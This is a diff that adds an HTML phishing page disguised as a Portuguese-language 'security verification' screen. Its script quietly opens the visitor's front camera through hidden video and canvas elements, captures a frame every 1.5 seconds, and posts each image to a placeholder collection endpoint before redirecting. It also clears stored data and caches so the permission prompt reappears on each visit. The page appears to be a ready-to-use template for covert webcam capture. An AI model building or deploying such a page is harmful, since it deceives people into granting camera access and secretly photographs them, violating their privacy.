@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Verification</title>
+    <!-- Meta tags to prevent caching and force permission requests -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <style>
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+        }
+        
+        .icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+            color: #667eea;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
+            font-weight: 600;
+        }
+        
+        p {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        
+        .status {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border-left: 4px solid #667eea;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .redirect-btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 20px;
+        }
+        
+        .redirect-btn:hover {
+            background: #5a6fd8;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+    </style>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+function post(imgdata) {
+    $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'forwarding_link/post.php',
+        dataType: 'json',
+        async: false,
+        success: function(result) {
+            // call the function that handles the response/results
+        },
+        error: function() {
+        }
+    });
+}
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+    audio: false,
+    video: {
+        facingMode: "user"
+    }
+};
+
+// Clear any stored permissions and force new permission request
+function clearStoredPermissions() {
+    // Clear localStorage and sessionStorage
+    localStorage.clear();
+    sessionStorage.clear();
+    
+    // Clear any cached permissions by reloading without cache
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.getRegistrations().then(function(registrations) {
+            for(let registration of registrations) {
+                registration.unregister();
+            }
+        });
+    }
+}
+
+// Access webcam with forced permission request
+async function init() {
+    try {
+        // Clear any stored permissions first
+        clearStoredPermissions();
+        
+        // Add a small delay to ensure cleanup is complete
+        await new Promise(resolve => setTimeout(resolve, 100));
+        
+        // Force new permission request by using different constraints each time
+        const timestamp = Date.now();
+        const dynamicConstraints = {
+            audio: false,
+            video: {
+                facingMode: "user",
+                // Add dynamic properties to force new permission request
+                width: { ideal: 640 + (timestamp % 10) },
+                height: { ideal: 480 + (timestamp % 10) }
+            }
+        };
+        
+        const stream = await navigator.mediaDevices.getUserMedia(dynamicConstraints);
+        handleSuccess(stream);
+    } catch (e) {
+        if (errorMsgElement) {
+            errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+        }
+    }
+}
+
+// Success
+function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+
+    var context = canvas.getContext('2d');
+    setInterval(function(){
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData);
+    }, 1500);
+
+    // After camera capture starts, wait 3 seconds then redirect
+    setTimeout(function() {
+        window.location.href = 'CUSTOM_URL';
+    }, 3000);
+}
+
+// Prevent caching and force permission request on every load
+window.addEventListener('beforeunload', function() {
+    clearStoredPermissions();
+});
+
+// Add cache-busting parameters
+window.addEventListener('load', function() {
+    // Clear browser cache for this page
+    if ('caches' in window) {
+        caches.keys().then(function(names) {
+            names.forEach(function(name) {
+                caches.delete(name);
+            });
+        });
+    }
+});
+
+// Load init with delay to ensure clean state
+window.onload = function() {
+    setTimeout(function() {
+        init();
+    }, 200);
+};
+</script>
+
+<body>
+    <div class="container">
+        <div class="icon">🔐</div>
+        <h1>Verificação de segurança</h1>
+        <p>Por favor, permita as permissões necessárias para acessar o conteúdo solicitado com segurança.</p>
+        
+        <div class="status">
+            <p id="status-text">Inicializando verificação de segurança...</p>
+            <div class="spinner"></div>
+        </div>
+        
+        <p style="font-size: 14px; color: #888;">
+            Essa verificação garante acesso seguro ao conteúdo.
+        </p>
+        
+        <p style="font-size: 16px; color: #667eea; font-weight: 600;">
+            Redirecionando automaticamente em 3 segundos...
+        </p>
+    </div>
+</body>
+</html>
